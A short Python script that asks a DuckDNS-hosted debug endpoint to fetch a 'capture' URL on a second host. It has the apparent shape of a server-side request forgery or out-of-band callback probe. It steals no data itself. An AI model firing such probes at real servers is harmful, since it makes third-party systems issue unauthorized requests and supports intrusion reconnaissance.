import urllib.request
import json
try:
    req = urllib.request.Request("https://proxymazegmora.duckdns.org/debug/test-post?url=http://evaluator.torchproxies.com/__capture/9551/capture/d7e42a4f-228f-4c7c-98b4-ae6939d49abd")
    with urllib.request.urlopen(req) as resp:
        print(resp.read().decode())
except Exception as e:
    print(e)
